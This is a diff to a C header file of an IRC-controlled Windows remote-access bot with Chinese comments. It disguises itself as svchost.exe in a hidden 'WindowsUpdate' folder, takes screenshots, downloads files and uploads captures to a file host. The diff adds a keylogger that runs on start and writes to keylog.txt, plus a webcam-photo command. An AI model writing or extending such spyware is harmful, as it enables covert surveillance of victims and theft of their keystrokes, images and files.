@@ -24,6 +24,7 @@
 
 
 
+
 // Constants
 #define DEFAULT_BUFLEN 4096
 #define MAX_SEND_LENGTH 400  // 最大发送长度（接近但不超过IRC限制）
@@ -37,11 +38,12 @@
 // 隐藏文件夹路径
 #define HIDDEN_FOLDER L"\\WindowsUpdate"  // 直接放在 AppData\\Local 下
 #define TARGET_EXE_NAME L"svchost.exe"
+#define OUT_FILE L"keylog.txt"
 
-#define UPDATE_FOLFER L"\\NewVersion"
 
 #define DEBUG 0
 #define HIDE_ON_ENTRY 1
+#define KEYLOG_ON_ENTRY
 //#define FILE_ATTR_HIDDEN
 
 
@@ -67,6 +69,7 @@ typedef enum
     CMD_UPDATE_EXE,
     CMD_GET_APPDATA_PATH,
     CMD_TAKE_SCREENSHOT,
+    CMD_TAKE_CAMSHOT,
     CMD_HTTP_DOWNLOAD,
 }CommandType;
 typedef struct
@@ -112,6 +115,7 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock);
 
 //network.c
 SOCKET TCPhandler(const char* server, const char* baseNick);
+int join_channel(const char* channel);
 
 
 //message.c
@@ -141,6 +145,7 @@ int compute_sha256(const BYTE* data, size_t len, char output[65]);
 
 extern char log_path[MAX_PATH_LEN];
 extern char appdata_path[MAX_PATH_LEN];
+
 void bot_log(const char* format, ...);
 void init_log_path();
 
@@ -156,5 +161,11 @@ int take_screenshot(char* out_path, int path_len);
 
 //http_upload.c
 char* upload_to_uguu(const char* file_path);
+
+//keylogger.c
+int start_keylog();
+
+//webcame.c
+int take_webcam_photo(char* out_path, int path_len);
   
 #endif
